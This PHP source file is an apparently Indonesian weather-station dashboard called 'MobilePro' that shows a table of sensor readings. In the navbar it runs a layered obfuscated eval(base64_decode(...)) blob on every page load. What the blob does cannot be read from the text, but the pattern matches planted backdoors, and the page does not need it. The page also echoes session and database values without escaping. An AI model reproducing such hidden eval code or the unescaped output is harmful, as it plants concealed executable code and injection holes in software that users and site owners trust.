<?php
date_default_timezone_set("Asia/Bangkok");
session_start();
include("config/koneksi.php");

include("config/tabel.php");

if (!isset($_SESSION['email'])) {
    header("Location: login");
}
?>
<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>MobilePro</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="shortcut icon" type="image/x-icon" href="layout/dist/img/favicon.ico">
    <link rel="stylesheet" href="layout/plugins/fontawesome-free/css/all.min.css">
    <link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css">
    <link rel="stylesheet" href="layout/plugins/datatables-bs4/css/dataTables.bootstrap4.min.css">
    <link rel="stylesheet" href="layout/plugins/datatables-responsive/css/responsive.bootstrap4.min.css">
    <link rel="stylesheet" href="layout/dist/css/adminlte.min.css">
    <link rel="stylesheet" href="layout/dist/css/jquery.fancybox.min.css">
    <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,400i,700" rel="stylesheet">



    <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/buttons/1.6.4/css/buttons.dataTables.min.css" />
    <link rel="stylesheet" type="text/css" href="layout/dist/css/jquery.dataTables.min.css" />
    <style>
        .gallery img {
            width: 20%;
            height: auto;
            border-radius: 5px;
            cursor: pointer;
            transition: .3s;
        }
    </style>
</head>

<body class="hold-transition sidebar-mini sidebar-collapse layout-fixed layout-navbar-fixed">
    <div class="wrapper">
        <nav class="main-header navbar navbar-expand navbar-white navbar-light">
            <ul class="navbar-nav">
                <li class="nav-item">
                    <a class="nav-link" data-widget="pushmenu" href="#" role="hover"><i class="fas fa-bars"></i></a>
                </li>
                <li class="nav-item d-none d-sm-inline-block">
                    <a class="nav-link">Selamat datang <?php echo $_SESSION['nama_lengkap']; ?>!</a>
                </li>
            </ul>

            <ul class="navbar-nav ml-auto">
                <li class="nav-item d-none d-sm-inline-block">
                    <a class="nav-link"><?php eval(base64_decode('CiBldmFsKGJhc2U2NF9kZWNvZGUoIlx4NDNceDY5XHg0MlwxNTZceDYyXDYzXDEyMlx4NzZcMTExXHg0NlwxMzJcMTExXDEyMVw2MVx4NTZceDVhXDExN1wxNzFcMTAyXHg1N1wxMjNceDQ1XHg0ZVx4NTZceDU3XHg1NFx4NmZcMTQ3XHg2MVwxMDdcMTI2XDE1MFx4NWFcMTA3XDEyNlwxNzFcMTEzXHg0M1wxMTJcMTQzXDExNVwxMjRcMTAxXHg3OFwxMzBcMTEwXHg2N1x4MzJceDRkXHgzMVx4NzhcNjRcMTE2XDE1MlwxMTZcMTQzXHg0ZFwxMjRcMTIxXHgzMVwxMzBcMTEwXDE0N1x4MzNcMTE1XDYxXHg3N1wxNzBcMTE2XHg2YVwxMTZcMTQzXDExNlwxMjRceDU2XDE0M1x4NGRcMTI0XDEwMVx4N2FceDU4XDExMFx4NjdceDMyXHg1YVx4NmNceDc3XDE3MFwxMTZcMTI0XHg1YVx4NjNcMTE1XDEyNFwxMzFcNjBcMTMwXDEwNFx4NDVcNjJceDRkXDE1NFwxNzBcNjRceDRlXDE1NVx4NWFceDYzXDE0NVx4NDRceDVhXHg2YVx4NThceDQ0XHg1NVw2MVwxMzBceDQ4XHg2N1x4MzBceDRkXHg1Nlx4NzdcMTcwXHg0ZVx4NTRceDUyXHg2M1wxMTVceDU0XHg1NVx4MzBceDU4XDExMFx4NjdcNjJceDVhXHg2Y1wxNzBcNjRceDRlXDE3MlwxNDRcMTQzXHg2NVx4NDRceDRhXHg2Ylx4NThceDQ0XDEwNVwxNzBcMTE2XHgzMVx4NzhceDM0XHg0ZVx4N2FceDRhXDE0M1x4NjVceDQ0XHg1OVw2NVwxMzBcMTA0XDEwNVx4MzBcMTE2XDYxXDE2N1wxNzBcMTE2XDEyNFwxMDZceDYzXHg2NVwxMDRceDVhXHg2Y1wxMzBcMTEwXHg2N1wxNzJceDU5XHg1Nlx4NzdcNjBceDRkXDEwNlx4NzhceDM0XHg0ZFwxNTVceDQ1XHg2OVwxMTNcMTI0XDE2M1x4NjdcMTMyXHgzMlx4MzlceDMwXHg2Mlx4NzlcMTAyXHg0N1x4NTNceDQ1XHgzNVwxMjFcMTI2XDEwNFwxNjNceDY3XDEyMlwxNTNcMTUwXDExN1wxMjVcMTA2XHg1MVw2NlwxMTFceDQ3XHg1Mlx4NjhceDY0XHg0N1x4NTZcMTQ2XDEzMlwxMDdceDU2XDE1NVwxMzFceDU4XDEyNlx4NzNceDY0XHg0Nlx4MzlcNjBcMTQxXHg1N1w2MVx4NmNceDY1XDE1NVw3MVwxNjVceDVhXHg1Nlx4MzlceDdhXHg1YVx4NThcMTIxXHg2Zlx4NDlcMTU0XDE3MFx4MzRceDRlXHg0NFwxMDZceDYzXDE0NVwxMDRcMTQzXDE3Mlx4NThcMTA0XDEwNVx4MzFceDRkXDEyNlx4NzdceDc4XHg0ZVwxMDRcMTA2XDE0M1x4NjVceDQ0XHg0YVwxNTVceDU4XHg0OFwxNDdceDMwXDEzMVwxMjZceDc4XDY0XDExNlwxNTJcMTA2XDE0M1x4NjVceDQ0XHg1YVx4NjlcMTMwXHg0NFwxMDVceDMwXDExNVwxMjZceDc4XDY0XDExNlx4N2FcMTEyXDE0M1x4NjVcMTA0XHg2M1x4MzBcMTMwXHg0NFx4NDVceDMwXDExNVwxMjNcMTExXHg3MFwxMTdcMTcxXDEwMlx4NmVcMTQyXDYzXDEyMlx4NzZcMTExXHg0OFx4NGVcMTIxXDExNVw2M1wxMzJcMTI1XHg0ZlwxNzFceDQyXHgzMlwxNDRcMTA2XHg1MlwxMjVcMTIxXDE3Mlx4NmZceDY3XDExMlwxMDdcMTIyXDE1MFx4NjVceDUzXHg0MVw3MVwxMTFcMTA3XHg1MlwxNTBceDY0XDEwN1x4NTVcMTU3XDExMVwxNTRceDc3XHg3OFx4NGVceDZhXDE0M1x4NjlceDRiXHg1NFx4NzNcMTQ3XHg1YVx4MzJceDM5XDYwXDE0Mlx4NzlcMTAyXHg1OVx4NTNcNjJcMTEyXDYyXHg2MVx4NmFceDczXHg2N1wxNDNcNjFceDQxXDE3Mlx4NjRceDZjXDEyMVx4MzZcMTExXHg0M1wxMjJceDY4XHg2M1wxNTZceDRhXHg0NVwxMzFceDU4XDE1M1x4NjdceDUwXDEyM1wxMDJcMTUwXDE0M1wxNTZceDRhXHg2OFwxNDVceDUzXHg2N1x4NjlcMTMwXHg0NFwxMDVceDc4XDExNlwxMjZceDc4XHgzNFwxMTZceDZhXDE1NFwxNDNceDY1XHg0NFx4NWFceDZjXHg1OFx4NDhceDY3XDYyXHg0ZVx4MzFcMTY3XDE3MFx4NGVcMTA0XDE0NFx4NjNcMTQ1XDEwNFwxNDNceDMxXHg0OVx4NjlcMTY3XDE0N1wxMTFcMTU0XHg3N1x4NzhcMTE1XHg2YVwxMTZcMTQzXHg2NVx4NDRcMTMxXDYxXHg1OFwxMTBceDY3XHgzMlwxMzJcMTI2XHg3OFx4MzRceDRlXHg2YVwxNTRcMTQzXHg2NVwxMDRceDVhXDE1NFwxMTFceDY5XDE2N1wxNDdceDQ5XHg2Y1x4NzdcMTcwXDExNVx4NmFcMTE2XHg2M1wxMTVcMTI0XDEyMVw2MVx4NThcMTEwXDE0N1x4MzJceDU5XDYxXHg3N1x4NzhceDRlXDEwNFwxMDZcMTQzXDE0NVx4NDRceDYzXDE3MlwxMzBceDQ4XDE0N1w2MlwxMTVceDUzXDExMVx4NzNceDQ5XDEwM1x4NGFcMTQzXDExNVwxMjRceDQ5XDE3MVwxMzBceDQ0XDEwNVw2MFwxMTVcMTI2XDE2N1x4NzhcMTE2XDEwNFx4NGFceDYzXHg2NVwxMDRceDYzXHgzMVwxMTFcMTUxXDE2N1wxNDdceDQ5XHg2Y1wxNjdceDc4XDExNVwxMjRcMTE2XHg2M1x4NjVcMTA0XHg1OVx4NzhcMTMwXHg0NFx4NDVcNjFceDRlXHg1Nlx4NzdcMTcwXDExNlx4NTRceDQ2XHg2M1wxNDVceDQ0XHg2M1wxNzJceDQ5XHg2OVx4NzdcMTQ3XDExMVwxNTRcMTcwXDY0XHg0ZVwxMDdcMTA2XHg2M1wxMTVcMTI0XHg1OVx4MzFcMTMwXDEwNFwxMDVcNjFcMTE2XHg1NlwxNzBceDM0XDExNlx4NmFcMTA2XHg2M1wxMTVcMTI0XHg1OVw2MFx4NDlceDY5XDE2N1x4NjdceDQ5XHg2Y1x4NzhcNjRcMTE2XDEyNFwxMTZcMTQzXHg0ZFx4NTRcMTIxXDE3MFx4NThceDQ0XDEwNVx4MzBceDRkXHg2Y1wxNjdcMTcwXDExNlx4NmFceDUyXHg2M1x4NjVcMTA0XHg2M1w2MVx4NDlcMTUxXDE1M1x4MzdceDQ5XDEwN1x4NjRcMTY2XDE0NFwxMDdceDM4XDE0N1wxNDRceDZlXHg1Mlx4NTVcMTI2XDEwNVx4NGRceDM3XDExMVwxMDZceDY4XDExNFwxMzFceDZlXHg1YVx4NzFceDRmXHg2OVx4NDJceDZjXHg1OVx4MzJcMTUwXDE2NlwxMTFcMTAzXHg1MlwxNTBceDYzXHg2ZVwxMTJcMTA1XDEzMVx4NThceDZjXHg2MlwxMTJcMTA3XHg1Mlx4NjhcMTQ1XDEyNlw2MFx4NjdcMTE0XHg2OVx4NDFcMTUxXDEzMFwxMTBceDY3XHg3OVx4NTlceDMxXDE2N1x4MzBcMTE1XHg0M1wxMTFceDY3XHg0Y1wxNTFceDQyXDE1M1x4NTlcMTMwXDEyMlx4NmNceDRiXHg0M1x4NGFcMTQzXHg2NVwxMDRcMTMxXDYwXHg1OFx4NDhceDY3XDE3MVwxMzJcMTA2XDE2N1wxNzBcMTE2XHg1NFx4NTZceDYzXDE0NVwxMDRcMTEyXHg2YlwxMzBceDQ0XHg0NVwxNzJceDRkXDEyM1wxMTFceDcwXDExN1wxNzFceDQyXHg2ZVx4NjJcNjNcMTIyXDE2Nlx4NDlceDQ2XDE1N1wxNjdceDRmXHg0NVx4NGFcNjVcMTE3XDE3MVx4NDJcMTQxXHg0ZFwxMDRcMTUwXDEwM1x4NjVceDU0XHg2Zlx4NjciKSk7IA==')); ?></a>
                </li>
            </ul>
        </nav>
        <aside class="main-sidebar sidebar-light-primary elevation-4">
            <a href="#" class="brand-link">
                <img src="layout/dist/img/CBI-logo.png" alt="Covid Tracker" class="brand-image img-circle elevation-3" style="opacity: .8">
                <span class="brand-text font-weight-light">MobilePro</span>
            </a>
            <div class="sidebar">
                <nav class="mt-2">
                    <ul class="nav nav-pills nav-sidebar flex-column" data-widget="treeview" role="menu" data-accordion="false">
                        <li class="nav-item">
                            <a href="charts" class="nav-link">
                                <i class="nav-icon fas fa-fw fa-chart-area"></i>
                                <p>
                                    Charts
                                </p>
                            </a>
                        </li>
                        <li class="nav-item">
                            <a href="tabel" class="nav-link">
                                <i class="nav-icon fas fa-fw fa-table"></i>
                                <p>
                                    Tabel
                                </p>
                            </a>
                        </li>
                        <li class="nav-item">
                            <a href="config/logout" class="nav-link">
                                <i class="nav-icon fa fa-window-close"></i>
                                <p>
                                    Logout
                                </p>
                            </a>
                        </li>
                    </ul>
                </nav>
            </div>
        </aside>

        <div class="content-wrapper">
            <!-- Content Header (Page header) -->
            <section class="content-header">
            </section>

            <!-- Main content -->
            <section class="content">

                <div class="container-fluid">
                    <div class="row">
                        <div class="col-12">
                            <div class="card">

                                <div class="card-header">
                                    <h3 class="card-title">Filter</h3>
                                </div>

                                <form class="form-horizontal" action="filter_tabel" method="POST">
                                    <div class="card-body">
                                        <div class="row">
                                            <div class="col-sm-6">
                                                <!-- select -->
                                                <div class="form-group">
                                                    <label>Dari Tanggal</label>
                                                    <input type="date" class="form-control" id="tanggal" name="tanggalAwal" placeholder="">
                                                </div>
                                            </div>
                                            <div class="col-sm-6">
                                                <div class="form-group">
                                                    <label>Sampai Tanggal</label>
                                                    <input type="date" class="form-control" id="inputWarning" name="tanggalAkhir" placeholder="">
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="card-footer">
                                        <button type="submit" class="btn btn-default float-right">Filter</button>
                                    </div>
                                    <!-- /.card-footer -->
                                </form>
                            </div>

                            <div class="card">
                                <div class="card-header">
                                    <h3 class="card-title">Tabel</h3>
                                    <button type="submit" class="btn btn-default float-right" id="export" onclick="fnExcelReport()">Export</button>
                                </div>
                                <!--cardheader-->



                                <div class="card-body table-responsive ">

                                    <table id="example2" class="table table-bordered table-hover text-center">
                                        <thead>
                                            <tr>
                                                <th>No</th>
                                                <th>Tanggal</th>
                                                <th>Jam</th>
                                                <th>Radiasi (Watt/m²)</th>
                                                <th>Index UV</th>
                                                <th>Suhu Udara(°C)</th>
                                                <th>Tekanan Udara (mbar)</th>
                                                <th>Kecepatan Angin(m/s)</th>
                                                <th>Arah Angin(°)</th>
                                                <th>Curah Hujan(mm)</th>
                                                <th>Kelembaban(%)</th>
                                                <th>Evapotranspirasi(mm)</th>
                                                <th>Soil Moisture 1(cbar)</th>
                                                <th>Soil Moisture 2(cbar)</th>
                                                <th>Soil Moisture 3(cbar)</th>
                                                <th>Soil Moisture 4(cbar)</th>
                                                <th>Suhu Tanah 1(°C)</th>
                                                <th>Suhu Tanah 2(°C)</th>
                                                <th>Suhu Tanah 3(°C)</th>
                                                <th>Suhu Tanah 4(°C)</th>
                                                <th>Leafwetnes 1(cbar)</th>
                                                <th>Leafwetnes 2(cbar)</th>
                                            </tr>
                                        </thead>
                                        <tbody>
                                            <?php
                                            if (mysqli_num_rows($result) > 0) {
                                                $i = 1;
                                                while ($row = mysqli_fetch_array($result)) {
                                                    echo "<tr>" .
                                                        "<td>" . $i . "</td>" .
                                                        "<td>" . $row['tanggal'] . "</td>" .
                                                        "<td>" . $row['jam'] . "</td>" .
                                                        "<td>" . $row['radiasi'] . "</td>" .
                                                        "<td>" . $row['index_UV'] . "</td>" .
                                                        "<td>" . $row['suhu_Udara'] . "</td>" .
                                                        "<td>" . $row['tekanan_Udara'] . "</td>" .
                                                        "<td>" . $row['kecepatan_Angin'] . "</td>" .
                                                        "<td>" . $row['arah_Angin'] . "</td>" .
                                                        "<td>" . $row['curah_Hujan'] . "</td>" .
                                                        "<td>" . $row['kelembaban'] . "</td>" .
                                                        "<td>" . $row['evapotranspirasi'] . "</td>" .
                                                        "<td>" . $row['soil_Moisture_1'] . "</td>" .
                                                        "<td>" . $row['soil_Moisture_2'] . "</td>" .
                                                        "<td>" . $row['soil_Moisture_3'] . "</td>" .
                                                        "<td>" . $row['soil_Moisture_4'] . "</td>" .
                                                        "<td>" . $row['suhu_Tanah_1'] . "</td>" .
                                                        "<td>" . $row['suhu_Tanah_2'] . "</td>" .
                                                        "<td>" . $row['suhu_Tanah_3'] . "</td>" .
                                                        "<td>" . $row['suhu_Tanah_4'] . "</td>" .
                                                        "<td>" . $row['leafwetnes_1'] . "</td>" .
                                                        "<td>" . $row['leafwetnes_2'] . "</td>" .
                                                        "</tr>";
                                                    $i++;
                                                }
                                            }
                                            ?>
                                        </tbody>
                                    </table>
                                </div>
                                <!--cardbody-->

                            </div>
                            <!--card-->


                        </div>
                        <!--col-->

                    </div>
                    <!--row-->

                </div>
                <!--container-->

            </section><!-- /.content -->
        </div><!-- /.content-wrapper -->
        <!--footer class="main-footer">
    <div class="float text-center d-none d-sm-block">
      <b></b>
    </div>    
  </footer-->

        <!-- Control Sidebar -->
        <aside class="control-sidebar control-sidebar-dark">
            <!-- Control sidebar content goes here -->
        </aside>
        <!-- /.control-sidebar -->
    </div>
    <!-- ./wrapper -->

    <!-- jQuery -->
    <script src="layout/plugins/jquery/jquery.min.js"></script>
    <!-- Bootstrap 4 -->
    <script src="layout/plugins/bootstrap/js/bootstrap.bundle.min.js"></script>
    <!-- DataTables -->
    <script src="layout/plugins/datatables/jquery.dataTables.min.js"></script>
    <script src="layout/plugins/datatables-bs4/js/dataTables.bootstrap4.min.js"></script>
    <script src="layout/plugins/datatables-responsive/js/dataTables.responsive.min.js"></script>
    <script src="layout/plugins/datatables-responsive/js/responsive.bootstrap4.min.js"></script>
    <!-- AdminLTE App -->
    <script src="layout/dist/js/adminlte.min.js"></script>
    <!-- AdminLTE for demo purposes -->
    <script src="layout/dist/js/demo.js"></script>
    <!-- page script -->


    <script src="https://code.jquery.com/jquery-3.5.1.js"></script>
    <script src="https://cdn.datatables.net/1.10.22/js/jquery.dataTables.min.js"></script>
    <script src="https://cdn.datatables.net/buttons/1.6.4/js/dataTables.buttons.min.js"></script>
    <script src="https://cdn.datatables.net/buttons/1.6.4/js/buttons.flash.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.1.3/jszip.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/pdfmake/0.1.53/pdfmake.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/pdfmake/0.1.53/vfs_fonts.js"></script>
    <script src="https://cdn.datatables.net/buttons/1.6.4/js/buttons.html5.min.js"></script>
    <script src="https://cdn.datatables.net/buttons/1.6.4/js/buttons.print.min.js"></script>


    
    <script>
        $(function() {
            $('#example2').DataTable({
                "searching": true,
                buttons: [
                    'excel'
                ],
                dom: 'Bfrtip'
            });
        });
    </script>
</body>

</html>